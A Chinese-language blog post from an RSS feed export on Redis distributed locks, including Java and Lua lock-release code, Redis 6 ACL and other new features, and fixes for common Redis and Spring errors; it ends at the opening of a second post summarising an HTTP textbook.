<p>&#x539F;&#x5B50;&#x6027;&#x573A;&#x666F;&#x662F;&#x5F53;&#x1F469;&#x1F3FB;&#x200D;&#x1F4BB;&#x5728;&#x4E0A;&#x9501;&#x540E;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#xFF0C;&#x4E8E;&#x91CA;&#x653E;&#x9501;&#x9636;&#x6BB5;&#x51C6;&#x5907;&#x5220;&#x9664;&#x65F6;&#xFF0C;&#x9501;&#x5230;&#x4E86;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x88AB;&#x81EA;&#x52A8;&#x91CA;&#x653E;&#xFF0C;&#x6B64;&#x65F6;&#x1F9D1;&#x1F3FB;&#x200D;&#x1F4BB;&#x83B7;&#x53D6;&#x4E86;&#x9501;&#x5E76;&#x8FDB;&#x884C;&#x5177;&#x4F53;&#x64CD;&#x4F5C;&#xFF0C;&#x90A3;&#x4E48;&#x1F469;&#x1F3FB;&#x200D;&#x1F4BB;&#x8FDB;&#x884C;&#x7684;&#x5220;&#x9664;&#x64CD;&#x4F5C;&#x4F1A;&#x5C06;&#x1F9D1;&#x1F3FB;&#x200D;&#x1F4BB;&#x7684;&#x9501;&#x5220;&#x9664;&#x3002;</p>
<blockquote>
<p>=&gt; &#x4E3A;&#x786E;&#x4FDD;&#x5206;&#x5E03;&#x5F0F;&#x9501;&#x53EF;&#x7528;&#xFF0C;&#x81F3;&#x5C11;&#x8981;&#x786E;&#x4FDD;&#x9501;&#x7684;&#x5B9E;&#x73B0;&#x540C;&#x65F6;&#x6EE1;&#x8DB3;&#x4EE5;&#x4E0B;&#x6761;&#x4EF6;</p>
<ul>
<li>&#x4E92;&#x65A5;&#x6027;&#x3002;&#x5728;&#x4EFB;&#x610F;&#x65F6;&#x523B;&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x80FD;&#x6301;&#x6709;&#x9501;&#x3002;</li>
<li>&#x53BB;&#x6B7B;&#x9501;&#x3002;&#x5373;&#x4F7F;&#x6709;&#x5BA2;&#x6237;&#x7AEF;&#x5728;&#x6301;&#x6709;&#x9501;&#x7684;&#x671F;&#x95F4;&#x5D29;&#x6E83;&#x800C;&#x672A;&#x4E3B;&#x52A8;&#x89E3;&#x9501;&#xFF0C;&#x4E5F;&#x8981;&#x4FDD;&#x8BC1;&#x540E;&#x7EED;&#x5176;&#x4ED6;&#x5BA2;&#x6237;&#x7AEF;&#x80FD;&#x52A0;&#x9501;&#x3002;</li>
<li>&#x52A0;&#x9501;&#x548C;&#x89E3;&#x9501;&#x5FC5;&#x662F;&#x540C;&#x4E00;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x4E0D;&#x80FD;&#x628A;&#x5176;&#x4ED6;&#x5BA2;&#x6237;&#x7AEF;&#x52A0;&#x7684;&#x9501;&#x7ED9;&#x89E3;&#x9664;&#x3002;</li>
<li>&#x52A0;&#x9501;&#x548C;&#x89E3;&#x9501;&#x5FC5;&#x987B;&#x5177;&#x6709;&#x539F;&#x5B50;&#x6027;&#x3002;</li>
</ul>
</blockquote>
<pre><code class="language-java">@ResetController
@RequestMapping(&quot;/redisTest&quot;)
public class RedisTestController{
    @Autowired
    private RedisTemplate redisTemplate;
    @GetMapping(&quot;testLock&quot;)
    public void testLock(){
        String uuid = UUID.randomUUID().toString();
        // &#x4E0A;&#x9501;
        Boolean lock = redisTemplate.opsForValue().setIfAbsent(&quot;lock&quot;, uuid, 3, TimeUnit.SECONDS);
        // &#x83B7;&#x53D6;&#x9501;&#x3001;&#x67E5;&#x8BE2;&#x503C;
        if(lock){
            Object value = redisTemplate.opsForValue().get(&quot;num&quot;);
            // &#x5224;&#x65AD; num
            if(StringUtils.isEmpty(value)){
                return;
            }
            // &#x6709;&#x503C;&#x5C31;&#x8F6C;&#x6210; int
            int num = Integer.parseInt(value+&quot;&quot;);
            // &#x628A; num &#x52A0; 1
            redisTemplate.opsForValue().set(&quot;num&quot;, ++num);
            // &#x91CA;&#x653E;&#x9501; =&gt; &#x6BD4;&#x8F83; UUID
            String lockTestUUID = (String)redisTemplate.opsForValue().get(&quot;lock&quot;);
            if(lockTestUUID.equals(uuid)){
                redisTemplate.delete(&quot;lock&quot;);
            }
        }else{
            // &#x83B7;&#x53D6;&#x9501;&#x5931;&#x8D25;
            try {
                // &#x6BCF;&#x9694; 0.1 &#x79D2;&#x518D;&#x83B7;&#x53D6;
                Thread.sleep(100);
                testLock();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
    @GetMapping(&quot;testLockLua&quot;)
    public void testLockLua() {
        // &#x58F0;&#x660E; uuid &#x505A;&#x4E3A;&#x4E00;&#x4E2A; value &#x653E;&#x5165; key &#x6240;&#x5BF9;&#x5E94;&#x7684;&#x503C;&#x4E2D;
        String uuid = UUID.randomUUID().toString();
        // &#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x9501; =&gt; lua &#x811A;&#x672C;&#x4F7F;&#x7528;&#x540C;&#x4E00;&#x628A;&#x9501;&#x6765;&#x5B9E;&#x73B0;&#x5220;&#x9664;
        String objId = &quot;10&quot;; // &#x8BBF;&#x95EE; objId &#x4E3A; 10 &#x53F7;&#x7684;&#x7269;&#x54C1; 100008348542
        String locKey = &quot;lock:&quot; + objId; // &#x9501;&#x4F4F;&#x7684;&#x662F;&#x6BCF;&#x4E2A;&#x5546;&#x54C1;&#x7684;&#x6570;&#x636E;
        // &#x83B7;&#x53D6;&#x9501;
        Boolean lock = redisTemplate.opsForValue().setIfAbsent(locKey, uuid, 3, TimeUnit.SECONDS);
        // &#x7B2C;&#x4E00;&#x79CD; =&gt; lock &#x4E0E;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x4E2D;&#x95F4;&#x4E0D;&#x5199;&#x4EFB;&#x4F55;&#x7684;&#x4EE3;&#x7801;
        // redisTemplate.expire(&quot;lock&quot;,10, TimeUnit.SECONDS); // &#x8BBE;&#x7F6E;&#x8FC7;&#x671F;&#x65F6;&#x95F4;
        if (lock) { // true
            // &#x6267;&#x884C;&#x7684;&#x4E1A;&#x52A1;&#x903B;&#x8F91;&#x5F00;&#x59CB;
            // &#x83B7;&#x53D6;&#x7F13;&#x5B58;&#x4E2D;&#x7684; num &#x6570;&#x636E;
            Object value = redisTemplate.opsForValue().get(&quot;num&quot;);
            // &#x662F;&#x7A7A;&#x76F4;&#x63A5;&#x8FD4;&#x56DE;
            if (StringUtils.isEmpty(value)) {
                return;
            }
            // &#x4E0D;&#x662F;&#x7A7A; =&gt; &#x51FA;&#x73B0;&#x4E86;&#x5F02;&#x5E38;&#x90A3;&#x4E48; delete &#x5931;&#x8D25; -&gt; &#x9501;&#x6C38;&#x5B58;
            int num = Integer.parseInt(value + &quot;&quot;);
            // &#x4F7F; num &#x6BCF;&#x6B21; +1 &#x653E;&#x5165;&#x7F13;&#x5B58;
            redisTemplate.opsForValue().set(&quot;num&quot;, String.valueOf(++num));
            /* &#x4F7F;&#x7528; lua &#x811A;&#x672C;&#x6765;&#x9501; */
            // &#x5B9A;&#x4E49;lua &#x811A;&#x672C;
            String script = &quot;if redis.call(&apos;get&apos;, KEYS[1]) == ARGV[1] then return redis.call(&apos;del&apos;, KEYS[1]) else return 0 end&quot;;
            // &#x4F7F;&#x7528; redis &#x6267;&#x884C; lua &#x6267;&#x884C;
            DefaultRedisScript&lt;Long&gt; redisScript = new DefaultRedisScript&lt;&gt;();
            redisScript.setScriptText(script);
            // &#x8BBE;&#x7F6E;&#x4E00;&#x4E0B;&#x8FD4;&#x56DE;&#x503C;&#x7C7B;&#x578B;&#x4E3A; Long
            // &#x5220;&#x9664;&#x5224;&#x65AD;&#x7684;&#x65F6;&#x8FD4;&#x56DE;&#x7684; 0 =&gt; &#x7ED9;&#x5176;&#x5C01;&#x88C5;&#x4E3A;&#x6570;&#x636E;&#x7C7B;&#x578B; -&gt; &#x4E0D;&#x5C01;&#x88C5;&#x9ED8;&#x8BA4;&#x8FD4;&#x56DE; String
            // &#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32;&#x4E0E; 0 &#x4F1A;&#x6709;&#x9519;&#x8BEF;&#x53D1;&#x751F;
            redisScript.setResultType(Long.class);
            // script &#x811A;&#x672C;&#x3001;&#x5224;&#x65AD;&#x7684;key&#x3001;key &#x6240;&#x5BF9;&#x5E94;&#x7684;&#x503C;
            redisTemplate.execute(redisScript, Arrays.asList(locKey), uuid);
        } else { // &#x5176;&#x4ED6;&#x7EBF;&#x7A0B;&#x7B49;&#x5F85;
            try {
                Thread.sleep(1000); // &#x7761;&#x7720;
                testLockLua(); // &#x7761;&#x9192;&#x8C03;&#x7528;&#x65B9;&#x6CD5;
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E6%96%B0%E7%89%B9%E6%80%A7">&#x65B0;&#x7279;&#x6027;</h2>
<h3 id="acl-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8"><a href="https://redis.io/docs/manual/security/acl/">ACL &#x8BBF;&#x95EE;&#x63A7;&#x5236;&#x5217;&#x8868;</a></h3>
<p>Access Control List &#x5728;&#x53EF;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x548C;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x952E;&#x65B9;&#x9762;&#x5BF9;&#x67D0;&#x4E9B;&#x8FDE;&#x63A5;&#x8FDB;&#x884C;&#x9650;&#x5236;&#x3002;</p>
<pre><code class="language-shell"># &#x5C55;&#x793A;&#x5F53;&#x524D;&#x7528;&#x6237;&#x4E0E;&#x64CD;&#x4F5C;&#x6743;&#x9650;
xxx.xx.xx.xxx:6381&gt; acl list
# &#x5177;&#x4F53;&#x7684;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;
xxx.xx.xx.xxx:6381&gt; acl cat
# &#x547D;&#x4EE4;&#x67E5;&#x770B;&#x5F53;&#x524D;&#x7528;&#x6237;
xxx.xx.xx.xxx:6381&gt; acl whoami
</code></pre>
<table>
<thead>
<tr>
<th>&#x7C7B;&#x578B;</th>
<th>&#x53C2;&#x6570;</th>
<th>&#x8BF4;&#x660E;</th>
</tr>
</thead>
<tbody>
<tr>
<td>&#x542F;&#x52A8;&#x548C;&#x7981;&#x7528;&#x7528;&#x6237;</td>
<td>on|off</td>
<td>&#x6FC0;&#x6D3B;|&#x7981;&#x7528;&#x67D0;&#x7528;&#x6237;&#x8D26;&#x53F7;</td>
</tr>
<tr>
<td>&#x6743;&#x9650;&#x7684;&#x6DFB;&#x52A0;&#x5220;&#x9664;</td>
<td>+|-&lt;command&gt; +@|-@&lt;category&gt; allcommands|nocommands</td>
<td>&#x5C06;&#x6307;&#x4EE4;&#x6DFB;&#x52A0;&#x5230;&#x7528;&#x6237;&#x53EF;&#x6267;&#x884C;&#x6307;&#x4EE4;&#x5217;&#x8868;&#xFF1B;&#x4ECE;&#x7528;&#x6237;&#x53EF;&#x6267;&#x884C;&#x6307;&#x4EE4;&#x5217;&#x8868;&#x79FB;&#x9664;&#x6307;&#x4EE4; &#x6DFB;&#x52A0;&#x8BE5;&#x7C7B;&#x522B;&#x4E2D;&#x7528;&#x6237;&#x8981;&#x8C03;&#x7528;&#x7684;&#x6240;&#x6709;&#x6307;&#x4EE4;&#xFF1B;&#x6709;&#x6548;&#x7C7B;&#x522B;&#x4E3A; @admin&#x3001;@set&#x3001;@sortedset&#x2026;&#xFF0C;&#x901A;&#x8FC7;&#x8C03;&#x7528; ACL CAT &#x67E5;&#x770B;&#x5B8C;&#x6574;&#x5217;&#x8868;&#x3002;&#x7279;&#x6B8A;&#x7684; @all &#x8868;&#x793A;&#x6240;&#x6709;&#x547D;&#x4EE4;&#xFF0C;&#x5305;&#x62EC;&#x5F53;&#x524D;&#x5B58;&#x5728;&#x4E8E;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x4EE5;&#x53CA;&#x5C06;&#x6765;&#x5C06;&#x901A;&#x8FC7;&#x6A21;&#x5757;&#x52A0;&#x8F7D;&#x7684;&#x547D;&#x4EE4;|&#x4ECE;&#x7528;&#x6237;&#x53EF;&#x8C03;&#x7528;&#x6307;&#x4EE4;&#x4E2D;&#x79FB;&#x9664;&#x7C7B;&#x522B; +@all&#x7684;&#x522B;&#x540D;|-@all&#x7684;&#x522B;&#x540D;</td>
</tr>
<tr>
<td>&#x53EF;&#x64CD;&#x4F5C;&#x952E;&#x7684;&#x6DFB;&#x52A0;&#x6216;&#x5220;&#x9664;</td>
<td>~&lt;pattern&gt;</td>
<td>&#x6DFB;&#x52A0;&#x53EF;&#x4F5C;&#x4E3A;&#x7528;&#x6237;&#x53EF;&#x64CD;&#x4F5C;&#x7684;&#x952E;&#x7684;&#x6A21;&#x5F0F; =&gt; ~* &#x8868;&#x793A;&#x5141;&#x8BB8;&#x6240;&#x6709;&#x7684;&#x952E;</td>
</tr>
</tbody>
</table>
<pre><code class="language-shell"># &#x6DFB;&#x52A0;&#x7528;&#x6237;
xxx.xx.xx.xxx:6381&gt; acl setuser test
xxx.xx.xx.xxx:6381&gt; acl list
2) &quot;user test off resetchannels -@all&quot;
# &#x8BBE;&#x7F6E;&#x6709;&#x7528;&#x6237;&#x540D;&#x3001;&#x5BC6;&#x7801;&#x3001;ACL&#x6743;&#x9650;&#x3001;&#x5E76;&#x542F;&#x7528;&#x7684;&#x7528;&#x6237;
xxx.xx.xx.xxx:6381&gt; acl setuser ontest on &gt;password ~cached:* +get
# &#x5207;&#x6362;&#x7528;&#x6237;|&#x9A8C;&#x8BC1;&#x6743;&#x9650;
xxx.xx.xx.xxx:6381&gt; auth ontest password
OK
xxx.xx.xx.xxx:6381&gt; acl whoami
(error) NOPERM this user has no permissions to run the &apos;acl|whoami&apos; command
</code></pre>
<h3 id="io-%E5%A4%9A%E7%BA%BF%E7%A8%8B">IO &#x591A;&#x7EBF;&#x7A0B;</h3>
<p>Redis6 &#x652F;&#x6301;&#x7684;&#x591A;&#x7EBF;&#x7A0B;&#x5176;&#x5B9E;&#x6307;&#x5904;&#x7406;&#x7F51;&#x7EDC;&#x6570;&#x636E;&#x7684;&#x8BFB;&#x5199;&#x548C;&#x534F;&#x8BAE;&#x89E3;&#x6790;&#x4E3A;&#x591A;&#x7EBF;&#x7A0B;&#xFF0C;&#x800C;&#x975E;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x591A;&#x7EBF;&#x7A0B;&#x3002;Redis6 &#x5BF9;&#x4E8E;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x4F9D;&#x7136;&#x662F;&#x5355;&#x7EBF;&#x7A0B;&#x3002;&#x7B80;&#x800C;&#x8A00;&#x4E4B;&#x4F9D;&#x65E7;&#x662F;&#x5355;&#x7EBF;&#x7A0B;&#x4E0E;&#x591A;&#x8DEF; IO &#x590D;&#x7528;&#x3002;</p>
<h3 id="%E6%94%AF%E6%8C%81-cluster">&#x652F;&#x6301; Cluster</h3>
<p>&#x8001;&#x7248; Redis &#x60F3;&#x8981;&#x642D;&#x96C6;&#x7FA4;&#x9700;&#x5355;&#x72EC;&#x5B89;&#x88C5; ruby &#x73AF;&#x5883;&#xFF0C;redis5 &#x5C06; redis-trib.rb &#x7684;&#x529F;&#x80FD;&#x96C6;&#x6210;&#x5230; redis-cli&#x3002;&#x6B64;&#x5916;&#x5B98;&#x65B9; redis-benchmark &#x5DE5;&#x5177;&#x4E5F;&#x652F;&#x6301; cluster &#x6A21;&#x5F0F;&#xFF0C;&#x901A;&#x8FC7;&#x591A;&#x7EBF;&#x7A0B;&#x7684;&#x65B9;&#x5F0F;&#x5BF9;&#x591A;&#x4E2A;&#x5206;&#x7247;&#x8FDB;&#x884C;&#x538B;&#x6D4B;&#x3002;</p>
<h3 id="%E5%85%B6%E4%BB%96%E6%9B%B4%E6%96%B0">&#x5176;&#x4ED6;&#x66F4;&#x65B0;</h3>
<ul>
<li>&#x65B0;&#x7684; Redis &#x901A;&#x4FE1;&#x534F;&#x8BAE; RESP3 &#x7528;&#x4E8E;&#x4F18;&#x5316;&#x670D;&#x52A1;&#x7AEF;&#x4E0E;&#x5BA2;&#x6237;&#x7AEF;&#x4E4B;&#x95F4;&#x901A;&#x4FE1;</li>
<li>Client side caching &#x5BA2;&#x6237;&#x7AEF;&#x7F13;&#x5B58;&#xFF08;&#x57FA;&#x4E8E; RESP3 &#x534F;&#x8BAE;&#x5B9E;&#x73B0;&#xFF09;&#x8FDB;&#x4E00;&#x6B65;&#x63D0;&#x5347;&#x7F13;&#x5B58;&#x7684;&#x6027;&#x80FD;&#xFF0C;&#x5C06;&#x5BA2;&#x6237;&#x7AEF;&#x7ECF;&#x5E38;&#x8BBF;&#x95EE;&#x7684;&#x6570;&#x636E; cache &#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x3002;&#x51CF;&#x5C11; TCP &#x7F51;&#x7EDC;&#x4EA4;&#x4E92;</li>
<li>Proxy &#x96C6;&#x7FA4;&#x4EE3;&#x7406;&#x6A21;&#x5F0F;&#x8BA9; Cluster &#x62E5;&#x6709;&#x50CF;&#x5355;&#x5B9E;&#x4F8B;&#x4E00;&#x6837;&#x7684;&#x63A5;&#x5165;&#x65B9;&#x5F0F;&#xFF0C;&#x964D;&#x4F4E;&#x4F7F;&#x7528; cluster &#x7684;&#x95E8;&#x69DB;&#x3002;&#x4E0D;&#x8FC7;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#x4EE3;&#x7406;&#x4E0D;&#x6539;&#x53D8; Cluster &#x7684;&#x529F;&#x80FD;&#x9650;&#x5236;&#xFF0C;&#x4E0D;&#x652F;&#x6301;&#x7684;&#x547D;&#x4EE4;&#x8FD8;&#x662F;&#x4E0D;&#x4F1A;&#x652F;&#x6301;&#xFF0C;&#x6BD4;&#x5982;&#x8DE8; slot &#x7684;&#x591A;&#x952E;&#x64CD;&#x4F5C;</li>
<li>Modules API &#x4F7F; Redis &#x53EF;&#x4EE5;&#x53D8;&#x6210;&#x4E00;&#x4E2A;&#x6846;&#x67B6;&#xFF0C;&#x5229;&#x7528; Modules &#x6765;&#x6784;&#x5EFA;&#x4E0D;&#x540C;&#x7CFB;&#x7EDF;</li>
</ul>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="bugs-%E8%A7%A3%E5%86%B3">Bugs &#x89E3;&#x51B3;</h2>
<ul>
<li>NOAUTH Authentication required.</li>
</ul>
<pre><code class="language-java">redis.clients.jedis.exceptions.JedisDataException: NOAUTH Authentication required.
</code></pre>
<p>SSM &#x6846;&#x67B6;&#x914D;&#x7F6E; redis &#x7684; Jedis &#x76F8;&#x5173; xml &#x914D;&#x7F6E;&#x540E;&#xFF0C;&#x8FDB;&#x884C;&#x5199;&#x5165;&#x6D4B;&#x8BD5;&#xFF0C;&#x51FA;&#x73B0;&#x6570;&#x636E;&#x5F02;&#x5E38;&#x3002;&#x539F;&#x56E0;&#x5728;&#x4E8E;&#x672A;&#x5BF9; redis &#x8FDB;&#x884C;&#x6388;&#x6743;&#x3002;</p>
<pre><code class="language-xml">&lt;!-- application.xml --&gt;
&lt;bean id=&quot;jedisPool&quot; class=&quot;redis.clients.jedis.JedisPool&quot;&gt;
    &lt;constructor-arg name=&quot;user&quot; value=&quot;xxx&quot;&gt;&lt;/constructor-arg&gt;
    &lt;constructor-arg name=&quot;password&quot; value=&quot;xxx&quot;&gt;&lt;/constructor-arg&gt;
    &lt;property name=&quot;...&quot; value=&quot;...&quot; /&gt;
&lt;/bean&gt;
</code></pre>
<ul>
<li>[ERR] Node REMOTEIP:PORT is not empty. Either the node already knows other nodes (check with CLUSTER NODES) or contains some key in database 0.</li>
</ul>
<p>&#x5F02;&#x5E38;&#x7684;&#x8282;&#x70B9;&#x53EF;&#x80FD;&#x4E0E;&#x5176;&#x4ED6;&#x8282;&#x70B9;&#x7EC4;&#x6210;&#x8FC7;&#x96C6;&#x7FA4;&#xFF0C;&#x6216;&#x8005;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x5305;&#x542B;&#x4E00;&#x4E9B;&#x6570;&#x636E;&#x3002;</p>
<p>&#x9996;&#x5148;&#x5E94;&#x505C;&#x6B62;&#x670D;&#x52A1;&#xFF0C;&#x82E5;&#x4E0D;&#x505C;&#x6B62;&#x670D;&#x52A1;&#x76F4;&#x63A5;&#x5220;&#x9664;&#x6587;&#x4EF6;&#x53EF;&#x80FD;&#x65E0;&#x6548;&#xFF1B;&#x5728;&#x5220;&#x9664;&#x751F;&#x6210;&#x7684;&#x5907;&#x4EFD; aof&#x3001;rdb&#x3001;nodes.conf &#x6587;&#x4EF6;&#x540E;&#x91CD;&#x542F;&#x670D;&#x52A1;&#xFF1B;&#x5728;&#x5FC5;&#x8981;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x4E5F;&#x53EF;&#x4EE5;&#x6267;&#x884C; <code>flushdb</code>&#x3002;</p>
<ul>
<li>[ERR] Not all 16384 slots are covered by nodes.</li>
</ul>
<p>&#x8FD9;&#x4E2A;&#x5F80;&#x5F80;&#x662F;&#x7531;&#x4E8E;&#x4E3B; node &#x79FB;&#x9664;&#xFF0C;&#x4F46;&#x5E76;&#x6CA1;&#x6709;&#x79FB;&#x9664; node &#x4E0A;&#x9762;&#x7684; slot&#xFF0C;&#x4ECE;&#x800C;&#x5BFC;&#x81F4; slot &#x603B;&#x6570;&#x6CA1;&#x6709;&#x8FBE;&#x5230; 16384&#xFF0C;&#x5BFC;&#x81F4; slots &#x5206;&#x5E03;&#x4E0D;&#x6B63;&#x786E;&#x3002;&#x5728;&#x5220;&#x9664;&#x8282;&#x70B9;&#x7684;&#x65F6;&#x5019;&#x4E00;&#x5B9A;&#x8981;&#x6CE8;&#x610F;&#x5220;&#x9664;&#x7684;&#x662F;&#x5426;&#x662F; Master &#x4E3B;&#x8282;&#x70B9;&#x3002;</p>
<pre><code class="language-shell"># redis-cli --cluster fix host:port =&gt; &#x4FEE;&#x590D;&#x96C6;&#x7FA4;
[centos myredis]# redis-cli --cluster fix 127.0.0.1:6379 
# redis-cli --cluster check host:port =&gt; &#x68C0;&#x67E5;
[centos myredis]# redis-cli --cluster check 127.0.0.1:6379
# redis-cli --cluster reshar host:port =&gt; &#x91CD;&#x65B0;&#x5206;&#x914D; slot
[centos myredis]# redis-cli --cluster reshard 127.0.0.1:6379
127.0.0.1:6379&gt; cluster nodes # &#x67E5;&#x770B;&#x8282;&#x70B9;&#x4E2D;&#x96C6;&#x7FA4;&#x4FE1;&#x606F;
</code></pre>
<ul>
<li>com.fasterxml.jackson.databind.ObjectMapper? &#x2325;&#x23CE;</li>
</ul>
<p>springboot &#x6574;&#x5408; redis &#x51FA;&#x73B0; ObjectMapper &#x627E;&#x4E0D;&#x5230;&#x76F8;&#x5173;&#x5305;&#x7684;&#x95EE;&#x9898;&#x3002;<a href="https://stackoverflow.com/questions/34290913/objectmapper-cannot-be-resolved-to-a-type">SOF</a>&#x3002;</p>
<blockquote>
<p>Data Binding API is used to convert JSON to and from POJO (Plain Old Java Object) using property accessor or using annotations. It is of two type. Simple Data Binding - Converts JSON to and from Java Maps, Lists, Strings, Numbers, Booleans and null objects.</p>
</blockquote>
<pre><code class="language-java">// &#x95EE;&#x9898;&#x4EE3;&#x7801;
ObjectMapper om = new ObjectMapper();
</code></pre>
<pre><code class="language-xml">&lt;dependency&gt;
    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
    &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;
    &lt;version&gt;2.13.3&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
    &lt;artifactId&gt;jackson-core&lt;/artifactId&gt;
    &lt;version&gt;2.13.3&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<ul>
<li>Cannot Resolve Symbol RestController</li>
</ul>
<p>&#x5728; pom.xml &#x4E2D;&#x52A0;&#x5165; spring-boot-starter-web &#x7684;&#x4F9D;&#x8D56;&#x3002;&#x5E38;&#x89C1;&#x4E8E;&#x521B;&#x5EFA; springboot &#x9879;&#x76EE;&#x65F6;&#x672A;&#x9009;&#x62E9; web &#x76F8;&#x5173; starter&#xFF0C;&#x4E5F;&#x4F1A;&#x5BFC;&#x81F4;&#x542F;&#x52A8;&#x65F6;&#x4E0D;&#x8F7D;&#x5165; web&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE;&#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[图解 HTTP 摘要]]></title><description><![CDATA[据 [日] 上野宣 HTTPの教科書 的部分摘要]]></description><link>yourdomain.com/httptextbook/</link><guid isPermaLink="false">6264efa3aa2820757fbb1478</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Mon, 09 Aug 2021 13:09:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2022/08/SeaWaves.jpg" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><h2 id="web-%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80">Web &#x53CA;&#x7F51;&#x7EDC;&#x57FA;&#x7840;</h2>
<img src="yourdomain.com/content/images/2022/08/SeaWaves.jpg" alt="&#x56FE;&#x89E3; HTTP &#x6458;&#x8981;"><p>&#x901A;&#x8FC7;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x83B7;&#x53D6;&#x670D;&#x52A1;&#x5668;&#x8D44;&#x6E90;&#x7684; Web &#x6D4F;&#x89C8;&#x5668;&#x7B49;&#xFF0C;&#x90FD;&#x53EF;&#x79F0;&#x4E3A; client &#x5BA2;&#x6237;&#x7AEF;&#x3002;Web &#x4F7F;&#x7528;&#x4E00;&#x79CD;&#x540D;&#x4E3A;&#x8D85;&#x6587;&#x672C;&#x4F20;&#x8F93;&#x534F;&#x8BAE; HyperText Transfer Protocol &#x4F5C;&#x4E3A;&#x89C4;&#x8303;&#xFF0C;&#x5B8C;&#x6210;&#x4ECE;&#x5BA2;&#x6237;&#x7AEF;&#x5230;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x7B49;&#x4E00;&#x7CFB;&#x5217;&#x8FD0;&#x4F5C;&#x6D41;&#x7A0B;&#x3002;&#x800C;&#x534F;&#x8BAE;&#x662F;&#x6307;&#x89C4;&#x5219;&#x7684;&#x7EA6;&#x5B9A;&#x3002;&#x53EF;&#x4EE5;&#x8BF4;&#xFF0C;Web &#x662F;&#x5EFA;&#x7ACB;&#x5728; HTTP &#x534F;&#x8BAE;&#x4E0A;&#x901A;&#x4FE1;&#x7684;&#x3002;</p>
<p>&#x901A;&#x5E38;&#x4F7F;&#x7528;&#x7684;&#x7F51;&#x7EDC;&#xFF08;&#x5305;&#x62EC;&#x4E92;&#x8054;&#x7F51;&#xFF09;&#x662F;&#x5728; TCP/IP &#x534F;&#x8BAE;&#x65CF;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#x8FD0;&#x4F5C;&#x7684;&#x3002;&#x800C; HTTP &#x5C5E;&#x4E8E;&#x5B83;&#x5185;&#x90E8;&#x7684;&#x4E00;&#x4E2A;&#x5B50;&#x96C6;&#x3002;TCP/IP &#x534F;&#x8BAE;&#x65CF;&#x91CC;&#x91CD;&#x8981;&#x7684;&#x4E00;&#x70B9;&#x5C31;&#x662F;&#x5206;&#x5C42;&#x3002;TCP/IP &#x534F;&#x8BAE;&#x65CF;&#x6309;&#x5C42;&#x6B21;&#x5206;&#x522B;&#x5206;&#x4E3A;&#x4EE5;&#x4E0B;4&#x5C42;&#xFF1A;&#x5E94;&#x7528;&#x5C42;&#x3001;&#x4F20;&#x8F93;&#x5C42;&#x3001;&#x7F51;&#x7EDC;&#x5C42;&#x548C;&#x94FE;&#x8DEF;&#x5C42;&#x3002;</p>
<ul>
